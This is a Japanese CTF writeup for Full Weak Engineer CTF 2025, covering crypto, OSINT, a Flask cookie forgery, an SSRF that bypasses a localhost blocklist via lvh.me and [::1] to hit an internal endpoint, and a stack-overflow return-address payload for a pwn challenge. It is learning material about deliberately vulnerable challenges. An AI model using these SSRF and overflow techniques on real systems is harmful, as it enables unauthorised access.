---
title: "Full Weak Engineer CTF 2025 ganyariya's Writeup"
emoji: "💬"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["ctf", "writeup"]
published: true
---

# はじめに

![](https://storage.googleapis.com/zenn-user-upload/57f0a7fb733d-20250901.png)

[Full Weak Engineer CTF 2025](https://ctf.fwectf.com/) に参加させていただきました。素敵なコンテストを開いていただきありがとうございました。

ganyariya は個人チーム srrr として参加し 271 位でした。もっと精進したいです。

![](https://storage.googleapis.com/zenn-user-upload/e65ca5078742-20250901.png)

この記事では ganyariya がコンテスト中に取り組んだ問題の Writeup を書きます。
なお、解けなかった問題については別途復習するため、そちらについては[個人の Note](https://note.ganyariya.dev/) もしくは zenn で別途記載します。

各タイトルに下記のマークを設定しています。

| Status        | Mark |
| ------------- | ---- |
| Solved        | ✅️    |
| Solved-WithAI | 🔺    |
| Unsolved      | ❌️    |

# ✅️ Welcome

![](https://storage.googleapis.com/zenn-user-upload/f2f413a14ea6-20250901.png)

指示されてあるとおりに discord のチャンネルを確認するとフラグがあります。

# ✅️ baby-crypto

![](https://storage.googleapis.com/zenn-user-upload/e5c6748dabfb-20250901.png)

不思議な文字列が与えられます。
これはシーザー暗号であるため、 CyberChef を利用して特定のフラグがでてくるまで文字を回すとよいです。

https://gchq.github.io/CyberChef/

![](https://storage.googleapis.com/zenn-user-upload/b6c9bdb2a8e7-20250901.png)

# ✅️ Poison Apple

![](https://storage.googleapis.com/zenn-user-upload/6d9147a5a474-20250901.png)

`iOS Watchdog crash` などで調べると `0x8badf00d` というアドレスコードが得られます。
これを入力すればいいです。

https://zenn.dev/numatech/articles/71f8fffc357c0e

# ✅️ strings jacking

![](https://storage.googleapis.com/zenn-user-upload/18d0e98368a9-20250901.png)

```bash
❯ file strings_jacking
strings_jacking: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2bda06321fb3449956642ae8867a4c4c9a29ffec, for GNU/Linux 3.2.0, not stripped
```

`strings_jacking` という Linux の ELF ファイルが与えられます。
問題文通りに strings で人間が読める plaintext 箇所を探し、 grep すればよいです。

```bash
❯ strings strings_jacking | grep fwectf
fwectf{5tr1n65_30F_p4ss937_0011}
fwectf_strings_jacking.c
```

# ✅️ regex-auth

![](https://storage.googleapis.com/zenn-user-upload/c777f8be80ce-20250901.png)

下記のような flask のコードが与えられます。

:::details flask.py

```py
from flask import Flask, request, redirect, make_response, render_template_string
import base64, os, re, random

app = Flask(__name__)
FLAG = os.getenv("FLAG", "fwectf{dummy}")

USERS = [
    "admin",
    "user",
    "asusn"
]

login_page = """
<!doctype html>
<title>Login</title>
<h1>Login</h1>
<form method="post">
  Username: <input type="text" name="username"><br>
  <input type="submit" value="Login">
</form>
"""

dashboard_page = """
<!doctype html>
<title>Dashboard</title>
<h1>Welcome, {{user}}!</h1>
<p>Your ID: {{uid}}</p>
<p>Your role: {{role}}</p>
<a href="/logout">Logout</a>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")

        if username in USERS:
            user_id = f"user_{random.randint(10000, 99999)}"
        else:
            user_id = f"guest_{random.randint(10000, 99999)}"

        uid = base64.b64encode(user_id.encode()).decode()

        resp = make_response(redirect("/dashboard"))
        resp.set_cookie("username", username)
        resp.set_cookie("uid", uid)
        return resp

    return render_template_string(login_page)

@app.route("/dashboard")
def dashboard():
    username = request.cookies.get("username")
    uid = request.cookies.get("uid")

    if not username or not uid:
        return redirect("/")

    try:
        user_id = base64.b64decode(uid).decode()
    except Exception:
        return redirect("/")

    if re.match(r"user.*", user_id, re.IGNORECASE):
        role = "USER"
    elif re.match(r"guest.*", user_id, re.IGNORECASE):
        role = "GUEST"
    elif re.match(r"", user_id, re.IGNORECASE): 
        role = f"{FLAG}"
    else:
        role = "OTHER"

    return render_template_string(dashboard_page, user=username, uid=user_id, role=role)

@app.route("/logout")
def logout():
    resp = make_response(redirect("/"))
    resp.delete_cookie("username")
    resp.delete_cookie("uid")
    return resp


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=3000)
```

:::

ここで重要な箇所としては user_id が `user.*`, `guest.*` 形式でなければフラグを返す、という点です。
そして、 user_id はクライアントから送付されてきた cookie をそのまま利用しています。

```py
@app.route("/dashboard")
def dashboard():
    username = request.cookies.get("username")
    uid = request.cookies.get("uid")

    if not username or not uid:
        return redirect("/")

    try:
        user_id = base64.b64decode(uid).decode()
    except Exception:
        return redirect("/")

    if re.match(r"user.*", user_id, re.IGNORECASE):
        role = "USER"
    elif re.match(r"guest.*", user_id, re.IGNORECASE):
        role = "GUEST"
    elif re.match(r"", user_id, re.IGNORECASE): 
        role = f"{FLAG}"
    else:
        role = "OTHER"

    return render_template_string(dashboard_page, user=username, uid=user_id, role=role)
```

よって、DevTools で Cookie の値を書き換えればよいです。

![](https://storage.googleapis.com/zenn-user-upload/cb1441f2de6a-20250901.png)
![](https://storage.googleapis.com/zenn-user-upload/b4b8ab999b8b-20250901.png)

## 学び

https://blog.hamayanhamayan.com/entry/2025/08/31/203606

はまやんさんの Writeup で知ったのですが curl によって cookie を設定できるのですね。
chrome で書き換えるのではなく curl の `-b 'key=value; key2=value2;...'` で行っていこうとおもいます。

```bash
❯ curl 'http://chal2.fwectf.com:8001/dashboard' -b 'username=hoge; uid=cXVlc3RfNzA0NjE='

<!doctype html>
<title>Dashboard</title>
<h1>Welcome, hoge!</h1>
<p>Your ID: quest_70461</p>
<p>Your role: fwectf{emp7y_regex_m47che5_every7h1ng}</p>
<a href="/logout">Logout</a>%
```

# ✅️ GeoGuessr1

![](https://storage.googleapis.com/zenn-user-upload/78ae47ca2972-20250901.png)
![](https://storage.googleapis.com/zenn-user-upload/c22dc8e8e9c7-20250901.jpg)

GeoGuessr のような形式の問題が CTF でも出るのですね...。
KFC の画像が与えられるためこの場所を探します。

`kentucky fried chicken 1065` で検索すると 1065 店舗目の KFC が見つかります。
あとはその緯度と経度を求めればよいです。

https://locations.kfc.com/ca/sunnyvale/1065-east-el-camino-real

![](https://storage.googleapis.com/zenn-user-upload/c3c9c7e9d381-20250901.png)

# 🔺 base🚀

## 問題

![](https://storage.googleapis.com/zenn-user-upload/33d0d252b8de-20250901.png)

絵文字列と `chall.py` が与えられます。
ここからフラグを復元する問題です。

こちらの問題について、方針は分かったものの自分で実装するとバグり散らかしてしまい、結局 gemini に頼ってしまいました。
Writeup 時は自分でコードを書き直しています。

```txt:problem
🪛🔱🛜🫗🚞👞🍁🎩🚎🐒🌬🧨🖱🥚🫁🧶🪛🔱👀🔧🚞👛😄🎩🚊🌡🌬🧮🤮🥚🫐🛞🪛🔱👽🔧🚞🐻🔳🎩😥🪨🌬🩰🖖🥚🫐🪐🪛🔱👿🫗🚞🏵📚🎩🚊🎄🌬🧯🕺🥚🫁📑🪛🔰🐀🫗🚞💿🔳🎩🚲🚟🌬🧲🚯🥚🫁🚰🪛🔱💀🔧🚞🏓🛼🎩🚿🪻🌬🧪🙊🥚🫐🧢🪛🔱🛟🔧🚞🚋🫳🎩😆🏉🌬🧶🚓🥚🫅💛🪛🔱🔌🐃🚞🐋🥍🎩😱🤮🌬🩰🛳🥚🫀📍🪛🔰🐽🫗🚞💿🍁🎩🚊🌋🌬🧵🔷🚀🚀🚀
```

```py:chall.py
#!/usr/bin/env python🚀

with open('emoji.txt', 'r', encoding='utf-8') as f:
    emoji = list(f.read().strip())

table = {i: ch for i, ch in enumerate(emoji)}

def encode(data):
    bits = ''.join(f'{b:08b}' for b in data)
    pad = (-len(bits)) % 10
    bits += '0' * pad
    out = [table[int(bits[i:i+10], 2)] for i in range(0, len(bits), 10)]
    r = (-len(out)) % 4
    if r:
        out.extend('🚀' * r)
    return ''.join(out)

if __name__ == '__main__':
    msg = 'Hello!'
    enc = encode(msg.encode())
    print('msg:', msg)
    print('enc:', enc)
```

`Hello!` を encode してみると `🐴🙅🥬🍴🎉🚀🚀🚀` となります。
よって、問題文で与えられた絵文字列は `problem = encode(flag)` と表記できます。
これを `flag = decode(problem)` のように復元する `decode` メソッドを実装すればよいです。

## 解法

```bash
❯ python3 chall.py
msg: Hello!
enc: 🐴🙅🥬🍴🎉🚀🚀🚀
```

decode メソッドを実装するために、まずを chall.py を詳しくみてみます。

やっている処理は以下です。

1. `'Hello!'` を .encode() で bytes に変換する
2. bytes を `8` の 2 進数に変換して join する
3. 10 bit 単位になるように padding する
4. 10 bit ごとに分割し、得られた 10bit ごとに整数へ変換して絵文字テーブルから絵文字を取得する
5. 絵文字の数が 4 の倍数になるように末尾に :rocket: をつける

```py:chall.py
with open('emoji.txt', 'r', encoding='utf-8') as f:
    emoji = list(f.read().strip())

# 0:⭐, 1:⭕, 2:🀄, ...
table = {i: ch for i, ch in enumerate(emoji)}

# data = b'Hello!'
def encode(data):
    # bits = 0100100001100101011011000110110001101111
    bits = ''.join(f'{b:08b}' for b in data)
    # 10 の単位になるよう末尾に 0 を足す
    pad = (-len(bits)) % 10
    bits += '0' * pad

    # int('0100100001', 2) = 289 番目の絵文字を取る, というように
    # 10 bit ごとに 10 進数に変換して table から絵文字を取得する
    out = [table[int(bits[i:i+10], 2)] for i in range(0, len(bits), 10)]

    # 絵文字が 4 の倍数になるようにする
    r = (-len(out)) % 4
    if r:
        out.extend('🚀' * r)
    return ''.join(out)

if __name__ == '__main__':
    msg = 'Hello!'
    enc = encode(msg.encode())
```

図にするとこのような流れで encode が行われています。
よって、これとは逆に decode を行えばよいです。

![](https://storage.googleapis.com/zenn-user-upload/66430fb7ebe7-20250901.png)

下記が自分の解法コードになります。
python に慣れていない& 文字コーディングに慣れていないため、苦戦しました。
`bytes [\xe3,\x81,\x82,...]` を UTF-8 decode すると `あ` のように戻してくれる、というのをちゃんと覚えていきたいです。

str ↔ bytes の変換を常に頭に入れようと思います。

```py
with open('emoji.txt', 'r', encoding='utf-8') as f:
    emoji = list(f.read().strip())
table = {i: ch for i, ch in enumerate(emoji)}

def decode(encoded: str) -> str:
    # 🚀 はただの padding であり 無視してよいので削除
    encoded = encoded.replace('🚀', '')

    # 11110000100111111010101010011011111....
    bits = ''
    for emoji in encoded:
        if emoji in table.values():
            # emoji の index を求めてその index を 10bit の 2 進数にする
            index = list(table.values()).index(emoji)
            bits += f'{index:010b}'

    # 本来の 8 bit 単位に戻す
    # (encode メソッドで勝手に 10bit 単位になるよう padding されている)
    if len(bits) % 8 != 0:
        bits = bits[:-(len(bits) % 8)]

    byte_list = []
    for i in range(0, len(bits), 8):
        # 11110000 → 240
        byte_str = bits[i:i+8]
        byte_int = int(byte_str, 2)
        byte_list.append(byte_int)

    # [240, 98, ...] → str
    # utf-8 の形式でバイト列 decode させる
    return bytes(byte_list).decode('utf-8')

if __name__ == '__main__':
    encoded = '🪛🔱🛜🫗🚞👞🍁🎩🚎🐒🌬🧨🖱🥚🫁🧶🪛🔱👀🔧🚞👛😄🎩🚊🌡🌬🧮🤮🥚🫐🛞🪛🔱👽🔧🚞🐻🔳🎩😥🪨🌬🩰🖖🥚🫐🪐🪛🔱👿🫗🚞🏵📚🎩🚊🎄🌬🧯🕺🥚🫁📑🪛🔰🐀🫗🚞💿🔳🎩🚲🚟🌬🧲🚯🥚🫁🚰🪛🔱💀🔧🚞🏓🛼🎩🚿🪻🌬🧪🙊🥚🫐🧢🪛🔱🛟🔧🚞🚋🫳🎩😆🏉🌬🧶🚓🥚🫅💛🪛🔱🔌🐃🚞🐋🥍🎩😱🤮🌬🩰🛳🥚🫀📍🪛🔰🐽🫗🚞💿🍁🎩🚊🌋🌬🧵🔷🚀🚀🚀'
    once = decode(encoded)
    print(once) # 🪛🔰🛏🍈📛🤵🔈🚁📷🦨🥩💇💼🥇🧷🥳🎆🚇🔅👶📷🚇🤧🗣💐🥵🌚🦽🏖🧇🪥🦿🏋🛜🙆🧀🏋🔭🥬🍲🔫🚀🚀🚀
    second = decode(once)
    print(second) # 🚀Congratulations! fwectf{n0_r0ck37_3m0ji_n0_llm}
```

## 学び

https://note.ganyariya.dev/01_Note/Unicode-%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6-Python-%E3%81%AE-Docs-%E3%82%92%E8%AA%AD%E3%82%80

- Unicode はすべての文字にコードポイントという一意性のある数字を割り振っている
- 各コードポイントをどういうバイト列で表現するか、というエンコーディングに UTF-8, UTF-16 など複数の種類がある
- str と bytes が相互変換でき、 `bytes[]` を decode することで str に自動変換できる

# ✅️ AED-master

![](https://storage.googleapis.com/zenn-user-upload/04dd4b2ed4cc-20250902.png)

## 問題

http://3811e9b093e24c298ce649fbc3ba053f0.chal3.fwectf.com:8004/

instance が与えられ、デフォルトだとランダムな文字がずっと表示されます。
うまく API を叩いて正しいフラグを出すようにする、という問題です。

![](https://storage.googleapis.com/zenn-user-upload/310093a2dae2-20250902.png)

:::details index.ts
```ts
import { Hono } from "hono"
import { getCookie, setCookie } from "hono/cookie"
import crypto from "crypto"

const app = new Hono()
const app2 = new Hono()

const FLAG = process.env.FLAG ?? "fwectf{You_Won!_Sample_Flag}"
const DUMMY = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}"
const FLAG_LEN = FLAG.length

let pwned = false

type Session = { idx: number }
const sessions = new Map<string, Session>()
const isAllowedURL = (u: URL) => u.protocol === "http:" && !["localhost", "0.0.0.0", "127.0.0.1"].includes(u.hostname)
const PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>AED</title>
<link rel="icon" href="/favicon.ico?v=3" type="image/x-icon" sizes="any">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
  :root{
    --bg: #ffffff;
    --fg: #1f1f27ff;
    --muted: #555555;
    --accent: #00bfff;
  }
  html,body{height:100%;}
  body{
    margin:0;
    background:var(--bg);
    color:var(--fg);
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    position:relative;
    overflow:hidden;
    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans";
  }
  .stage{
    position:relative;
    width:min(560px, 90vw);
    height:min(560px, 90vh);
    display:flex;
    align-items:center;
    justify-content:center;
  }

  /* Heart */
  #heart{
    width: min(38vmin, 220px);
    height: auto;
    display:block;
    color: var(--accent);
    filter: drop-shadow(0 6px 18px rgba(0, 191, 255, 0.32));
    transition: transform .25s ease, filter .25s ease, opacity .25s ease;
  }
  @keyframes beat {
    0%   { transform: scale(1);   }
    15%  { transform: scale(1.12);}
    30%  { transform: scale(1);   }
    45%  { transform: scale(1.12);}
    60%  { transform: scale(1);   }
    100% { transform: scale(1);   }
  }

  #flag{
    position:absolute;
    top:60%;
    left:50%;
    transform: translate(-50%, -50%);
    font-size: clamp(20px, 3vmax, 36px);
    letter-spacing:.08em;
    font-weight:600;
    color: var(--muted);
    white-space: nowrap;
    overflow-x: auto;
    max-width: 90vw;
  }

  body.mode-pwned #heart{
    animation: beat 1.2s ease-in-out infinite;
    filter: drop-shadow(0 0 22px rgba(0,191,255,.65));
  }
  body.mode-pwned #flag{
    color: #151227ff;
  }

  #out{ display:none; }
</style>
</head>
<body class="mode-safe">
  <div class="stage">
    <svg id="heart" viewBox="0 0 512 512" aria-label="heart" role="img">
      <path fill="currentColor" d="M471.6 73.1c-54.5-46.4-136-38.7-186.4 13.7L256 116l-29.2-29.2C176.4 34.4 94.9 26.7 40.4 73.1-21.4 125.8-13.4 227.8 43 285.5l187.2 190c7.5 7.6 19.6 7.6 27.1 0l187.2-190c56.4-57.7 64.4-159.7 26.9-212.4z"/>
    </svg>
    <div id="flag">????????????????</div>
    <div id="out"></div>
  </div>

<script>
const flagEl = document.getElementById('flag');
let live=false;
let len=0;
let buf=[];

async function beat(){
  const r = await fetch('/heartbeat');
  const d = await r.json();
  document.body.classList.toggle('mode-pwned', d.pwned === true);
  document.body.classList.toggle('mode-safe',  !(d.pwned === true));

const TALL_NARROW = "Iljtf{}"; 
if (!d.pwned) {
  buf.push(d.char);
  if (buf.length > 30) buf.shift();
  const html = buf.map(function (ch) {
    let pct;
    if (Math.random() < 1/2) {
      pct = 150;
    } else {
      pct = 100;
    }

    return '<span style="display:inline-block;color:#f00;font-size:' + pct + '%;">'
         + esc(ch)
         + '</span>';
  }).join('');

  flagEl.innerHTML = html;
  return;
}
  
function esc(s){
  return String(s).replace(/[&<>"']/g, function(m){
    return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]);
  });
}

  if(!live){
    live=true;
    len=d.len;
    buf=Array(len).fill('?');
  }
  buf[d.pos]=d.char;
  flagEl.textContent = buf.join('');
  if(buf.includes('?')) setTimeout(retryMissing,500);
}

function retryMissing(){
  if(!buf.includes('?')) return;
  fetch('/heartbeat').then(r=>r.json()).then(d=>{
    document.body.classList.toggle('mode-pwned', d.pwned === true);
    document.body.classList.toggle('mode-safe',  !(d.pwned === true));
    if(!d.pwned) return;
    if(buf[d.pos]==='?'){
      buf[d.pos]=d.char;
      flagEl.textContent = buf.join('');
    }
    if(buf.includes('?')) setTimeout(retryMissing,500);
  });
}

setInterval(beat,1000);
</script>
</body>
</html>`;

const getSid = (c: any) => {
  let sid = getCookie(c, "sid")
  if (!sid) {
    sid = crypto.randomUUID()
    setCookie(c, "sid", sid, { httpOnly: true, secure: true, sameSite: "Lax", path: "/" })
  }
  return sid
}

const getSession = (sid: string) => {
  let s = sessions.get(sid)
  if (!s) {
    s = { idx: -1 }
    sessions.set(sid, s)
  }
  return s
}

app.get('/favicon.ico', () => {
  const file = Bun.file('./public/favicon.ico')
  return new Response(file, {
    headers: {
      'Content-Type': 'image/x-icon',
      'Cache-Control': 'public, max-age=31536000, immutable',
    },
  })
})

app.use("*", (c, next) => {
  c.set("sid", getSid(c))
  return next()
})

app.get("/", c => {
  getSession(c.get("sid")).idx = -1
  return c.html(PAGE)
})

app.get("/heartbeat", c => {
  const s = getSession(c.get("sid"))
  if (!pwned) {
    const char = DUMMY[Math.floor(Math.random() * DUMMY.length)]
    return c.json({ pwned: false, char })
  }
  if (s.idx === -1) s.idx = 0
  const pos = s.idx
  const char = FLAG[pos]
  s.idx = (s.idx + 1) % FLAG_LEN
  return c.json({ pwned: true, char, pos, len: FLAG_LEN })
})

app2.get("/toggle", c => {
  pwned = true
  sessions.forEach(s => (s.idx = -1))
  return c.text("OK")
})

app.get("/fetch", async c => {
  const raw = c.req.query("url")
  if (!raw) return c.text("missing url", 400)
  let u: URL
  try {
    u = new URL(raw)
  } catch {
    return c.text("bad url", 400)
  }
  if (!isAllowedURL(u)) return c.text("forbidden", 403)
  const r = await fetch(u.toString(), { redirect: "manual" }).catch(() => null)
  if (!r) return c.text("upstream error", 502)
  if (r.status >= 300 && r.status < 400) return c.text("redirect blocked", 403)
  return c.text(await r.text())
})

const handler = (req: Request, server: any) => {
  const ip = server.requestIP(req)?.address ?? ""
  return app.fetch(req, { REMOTE_ADDR: ip })
}

const handler2 = (req: Request, server: any) => {
  const ip = server.requestIP(req)?.address ?? ""
  return app2.fetch(req, { REMOTE_ADDR: ip })
}

Bun.serve({ port: 3000, reusePort: true, fetch: handler })
Bun.serve({ port: 4000, reusePort: true, fetch: handler2 })
console.log(`Started server: http://localhost:3000`)
```
:::

## 解法

2 個の hono server `(app, app2)` が立っており、　random-domain.chal3.fwectf.com:8004 でアクセスできるのは app です。

k8s や docker によって `random-domain.chal3.fwectf.com:8004` が service 3000 port へ紐づけられているのだとおもいます。

フラグを得るためには app2 の `toggle` Endpoint を呼び出す必要があります。
しかし、おそらくこの app2 のポートはインターネットに公開されておらず外部からはアクセスできません。

脆弱な実装として `app` の `/fetch` という Endpoint が公開されており、 `?url=hoge` として指定した url へ app server はリクエストを送ってくれます。
この場合リクエスト送信元が `app` という hono server となるため、 app → app2 という内部リクエストではファイアウォールブロックがされていない可能性が高いです。
よって、 `/fetch` Endpoint を利用して app2 の toggle を呼び出すとよさそうです。

このような攻撃方法を `SSRF(Server Side Request Forgery)` と呼ぶようです（はじめて知りました）。
脆弱な公開サーバをハックして、予期しない Server Side Request (HTTP) を発火させて内部サーバにアクセスします。

https://blog.tokumaru.org/2018/12/introduction-to-ssrf-server-side-request-forgery.html

https://zenn.dev/chot/articles/88ea57e3108978

```ts
const isAllowedURL = (u: URL) => !["localhost", "0.0.0.0", "127.0.0.1"].includes(u.hostname)
```

ただし、上記のようにアクセスできる URL が定められています。

https://qiita.com/1ain2/items/194a9372798eaef6c5ab

コンテスト中に gemini へ聞いたところ `lvh.me` というドメインがローカルアドレスとして解決される、とのことでした。
コンテスト後に知りましたが lvh.me は levicook さんという方が立てた DNS であり、公式なものではありません。
利用を避けたほうがよいですね...。

https://gist.github.com/levicook/563675

IPv6 のアドレス記載方法として `[::1]:4000` のようにするとローカルアドレスとして解決され、こちらでも toggle を叩けました。

```
http://9f88c00823494540b787e6c5d73cd5990.chal3.fwectf.com:8004/fetch?url=http://lvh.me:4000/toggle
http://9fe6d1e1f6604ffea6218b36e311548d0.chal3.fwectf.com:8004/fetch?url=http://%5B::1%5D:4000/toggle
```

![](https://storage.googleapis.com/zenn-user-upload/314085c7628d-20250902.png)

## 学び

`[::]`, `[::1]`, `127.0.0.2/8` がループバックアドレスとして使えるのなるほどなとおもいました。
`127.0.0.1` の CIDR `/8` なのですね。

https://nanimokangaeteinai.hateblo.jp/entry/2025/08/31/213843

# 🔺 datamosh

![](https://storage.googleapis.com/zenn-user-upload/c7c17163a70c-20250902.png)

壊れている AVI ファイルが与えられます。
mac で開こうとしたところ開けませんよ、とポップアップがでました。

そもそも datamosh とはメディアファイルを意図的に Audacity などで書き換えてグリッチエフェクトの入ったものにする、というものだそうです。

https://note.com/gtakuya/n/na67fd821b99f

Audacity で音声ファイルとして読み込んだりしましたがこれもうまく動作しませんでした。
最終的に VLC Media Player をつかって再生でき、フラグが表示されました。

![](https://storage.googleapis.com/zenn-user-upload/01824eebb4f8-20250902.png)

## 学び

`VLC Media Player だと表示できることがある`

# ❌️ GeoGuessr2

![](https://storage.googleapis.com/zenn-user-upload/7dd957e59a29-20250902.png)

上記の画像が与えられるため、こちらをもとに場所を探してねという問題です。

こちらの画像を Google 検索したところ、 Instagram の投稿が見つかりました。

https://www.threads.com/@donnieosullivan/post/DDb8jEjthA2

これら画像を詳しくみると以下のような情報がわかります。

- Kaisertor や Suppen からドイツである
- マインツという都市である
- カイザー通りに存在する

カイザー通りを Google Map 上で歩いたのですが、このような光景を見つけられませんでした。

## 他の方の解答を参考にする

https://zenn.dev/sutonchoko/articles/efc7fa69135eaa#%5Bforensic%2Fosint%2C-easy%5D-geoguessr2-(320-solves)

惜しいところまではいけていたのですね、悔しいです。
画像にギリギリ表示されている `Maydonoz Döner` という店名から Map を検索し、その地点を出します。
すると、提示された画像と似た光景が見つかります。

![](https://storage.googleapis.com/zenn-user-upload/bca90d646a86-20250902.png)

フランクフルト、ならびに似た店の画像を探したのですが、そもそも Google Map 上にないこともあるのですね。

![](https://storage.googleapis.com/zenn-user-upload/fb2f78bcb013-20250902.png)

## 学び

- 写真を gemini に食わせて、文字を認識させて読み取ってもらう
- Google Map が作成されたときと写真が取られているときで光景が異なる
- Google 画像検索を利用して探す

# 🔺 No need Logical Thinking

## 問題

`Challenge.pl` と output.txt が与えられます。

```txt:output.txt
gyhgyl|qoj\>@@xqDD|zyJyg}UD¡
```

```pl
process_flag(FileName) :-
    open(FileName, read, Stream),           
    read_string(Stream, _, Content),        
    close(Stream),                          
    string_codes(Content, Codes),           
    transform_codes(Codes, 1, Transformed),
    string_codes(NewString, Transformed),   
    writeln(NewString).                     


transform_codes([], _, []).
transform_codes([H|T], Index, [NewH|NewT]) :-
    NewH is H + Index,                      
    NextIndex is Index + 1,                  
    transform_codes(T, NextIndex, NewT).     


%EXECUTE
%?- process_flag('flag.txt').
```

## 解法

見慣れないコードならびに拡張子のため、まずは何のコードなのか調べます。
インターネット検索すると Perl でしたが、 gemini に聞いたところ Prolog と教えてもらいました。
Perl と Prolog ともに拡張子同じなのですね。

https://www.ncaq.net/2023/08/03/00/41/41/

Prolog のコードを自分は読めないため gemini に python に変換してもらいました。

```py
def process_flag(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    transformed_chars = []
    for index, char in enumerate(content, 1):
        transformed_code = ord(char) + index
        transformed_chars.append(chr(transformed_code))

    new_string = "".join(transformed_chars)
    print(new_string)

process_flag('flag.txt')
```

よって、あとは復元するコードを python で書けばよいです。

```py
def decode_flag(file_path: str) -> None:
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    transformed_chars = []
    for index, char in enumerate(content, 1):
        transformed_code = ord(char) - index
        transformed_chars.append(chr(transformed_code))

    decoded = ''.join(transformed_chars)
    print(decoded)

decode_flag('output.txt')
```

```bash
❯ python3 res.py
fwectf{the_Pr010g_10gica1_Languag3!}
```

# ❌️ Pwn Me Baby

## 問題

![](https://storage.googleapis.com/zenn-user-upload/f812f2c3f0ab-20250902.png)

`nc chal2.fwectf.com 8000` でプログラムが動いており、それに不正な入力をおこなってフラグを獲得する問題です。
サーバでは以下のプログラムが動いています。

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void flag(){
  char buf[128]={0};
  int fd=open("flag.txt",O_RDONLY);
  if(fd==-1){
    puts("Couldn't find flag.txt");
    return;
  }
  read(fd,buf,128);
  puts(buf);
}

int main(void){
  char buf[16];
  printf("I will receive a message and do nothing else:");
  scanf("%s",buf);
  return 0;
}

__attribute__((constructor)) void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
```

`scanf("%s", buf)` がいかにも怪しくここに不正な入力をすれば強引に flag 関数が実行できそうです。
しかし、**自分はこの flag 関数を呼び出す方法がわからずコンテスト中解けませんでした。**

## 解法

https://note.ganyariya.dev/05_CTF/(Full-Weak-Engineer-CTF-2025)-Pwn-Me-Baby-%E3%82%92%E5%AD%A6%E3%81%B3%E3%81%AA%E3%81%8C%E3%82%89%E8%A7%A3%E3%81%8F

スタックフレームに関する Pwn の問題を解くのがはじめてだったため、いろいろなことを調べながら解きました。
より詳しい解法や右往左往については上記の note.ganyariya.dev を参照ください。

### セキュリティ機構を調べる

pwntools で配布された main ELF ファイルのセキュリティ機構を調べます。
すると `PIE: No PIE (0x400000)` と表示されます。
No PIE の場合、 .text 機械語命令が絶対的なアドレス指定がなされ、そのアドレスに命令が配置されないとうまく動かなくなります。
PIE であればどのアドレスに置かれても正しく動くようになっていますが、それが無効化されています。

よって、 flag / main 関数のアドレスが実行時にランダム化されず、特定のアドレスに配置されることがわかります。
ゆえに、 scanf でうまく攻撃テキストを入力すれば、 flag 関数を呼び出せそうです。

```bash
┌──(ganyariya㉿utmkali)-[~/ctf/fullweakctf/pwnmebaby/dist]
└─$ pwn checksec main
[*] '/home/ganyariya/ctf/fullweakctf/pwnmebaby/dist/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

### 攻撃コードを入力する

前知識として関数が利用する `スタックフレーム` への理解ならびにアセンブリコードへの理解が必要になります。
下記 note などを参考ください。

https://note.ganyariya.dev/01_Note/x86-64-%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E9%96%A2%E6%95%B0%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E6%99%82%E3%81%AE%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%81%AE%E6%8C%99%E5%8B%95%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B

gdb でレジスタの値やアセンブリコードを覗くと、 main 関数の実行時は以下のようなスタックフレームの構造になっています。
scanf でデータを入力すると、正しい使い方であれば 0x7fffffffea00 から 0x7fffffffea10 まで 16 文字 (NULL 文字を考慮すれば 15 文字) が配置されます。

```bash
0x0
+--------------+

------------ 0x7fffffffea00 ← rsp
~0x18 = 24 Byte~
main 関数のスタックフレーム
scanf で入力したデータ 0x7fffffffea00 から連続したアドレスに配置される
------------ 0x7fffffffea18
__libc_start_call_main へのリターンアドレス (0x0000000000401dd4)
------------ 0x7fffffffea20
__libc_start_call_main のスタックフレーム

+--------------+
0x00000000FFFFFFFFF
```

ここで `aaaaaaaaaaaaaaaaaaaaaaaa\x10\x18\x40\x0\x0\x0\x0\x0` と入力すれば、 `__libc_start_call_main へのリターンアドレス` を書き換えられます。

- a * 24
  - パディング
- `\x10\x18\x40\x0\x0\x0\x0\x0`
  - Flag 関数のアドレス
  - 0x401810 のリトルエンディアン

```bash
0x0
+--------------+

------------ 0x7fffffffea00 ← rsp
~0x18 = 24 Byte~ → a が 24 個書き込まれる
main 関数のスタックフレーム
------------ 0x7fffffffea18
__libc_start_call_main へのリターンアドレス (0x0000000000401dd4) → 0x401810 (flag 関数) に書き換えられる
------------ 0x7fffffffea20
__libc_start_call_main のスタックフレーム

+--------------+
0x00000000FFFFFFFFF
```

しかし、この攻撃コードを入力すると下記のようにセグフォエラーが発生するのみです。
なにか意図しないメモリエラーが起きています。

```bash
root@pve:~/ctf/fullweakctf/pwnmebaby/dist# echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\x10\x18\x40\x0\x0\x0\x0\x0" | ./main
I will receive a message and do nothing else:Segmentation fault
```


https://zenn.dev/koufu193/articles/b0aa6291d5655c#pwn-me-baby(pwn%2C-beginner)

作問者の方による Writeup では以下のように書かれています。
これはどういうことなのでしょうか。

> これはアライメントの問題なので RSP が 16 の倍数になるような命令が実行されるように調整する。
